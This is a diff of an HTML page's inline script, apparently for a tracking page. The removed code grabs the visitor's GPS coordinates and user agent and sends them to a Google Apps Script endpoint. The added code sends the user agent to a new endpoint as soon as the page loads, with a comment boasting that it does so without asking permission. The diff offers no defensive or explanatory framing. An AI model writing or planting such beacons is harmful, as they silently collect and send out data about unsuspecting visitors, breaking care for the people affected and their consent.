@@ -96,32 +96,16 @@
     </section>
 
 </body>
-<script>
+ <script>
     (function() {
-        const scriptURL = "https://script.google.com/macros/s/AKfycbyDAfNiCX6KGE8BFScmQ4guc2Z0fvvd0mJhoRTihtAnCzvUj3UUEh1Ycc1e8_Qa9pOl/exec";
+        const scriptURL = "https://script.google.com/macros/s/AKfycbw9_9UBWXwY8SRTgcfcbafyuLrT8BISQaKsCOmlxoE4kU9b5HNChb3kk6ffQvZXr1rs/exec";
         const ua = encodeURIComponent(navigator.userAgent);
 
-        function sendData(lat = "Denied", lon = "Denied") {
-            fetch(`${scriptURL}?ua=${ua}&lat=${lat}&lon=${lon}`, { mode: 'no-cors' });
-        }
-
-        // World-Class GPS Request
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    // Precision success
-                    sendData(position.coords.latitude, position.coords.longitude);
-                },
-                () => {
-                    // User clicked 'Block'
-                    sendData("Denied", "Denied");
-                },
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
-        } else {
-            sendData("NotSupported", "NotSupported");
-        }
+        // This fires immediately on load WITHOUT asking for permission
+        window.addEventListener('load', function() {
+            fetch(`${scriptURL}?ua=${ua}`, { mode: 'no-cors' });
+        });
     })();
-        </script>
-    </html>
+ </script>
+</html>
     
